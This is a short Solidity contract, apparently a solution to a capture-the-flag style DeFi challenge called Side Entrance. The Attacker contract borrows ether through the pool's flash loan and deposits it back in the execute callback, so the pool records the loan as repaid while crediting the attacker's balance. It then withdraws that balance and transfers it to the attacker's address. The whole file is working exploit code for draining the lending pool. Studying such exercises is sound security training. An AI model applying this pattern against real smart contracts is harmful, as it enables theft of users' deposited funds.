import "./SideEntranceLenderPool.sol";

contract Attacker {
    SideEntranceLenderPool pool;
    address payable attacker;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        attacker = payable(msg.sender);
    }

    function exploit(uint256 amount) public {
        pool.flashLoan(amount);
        pool.withdraw();
        attacker.transfer(amount);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
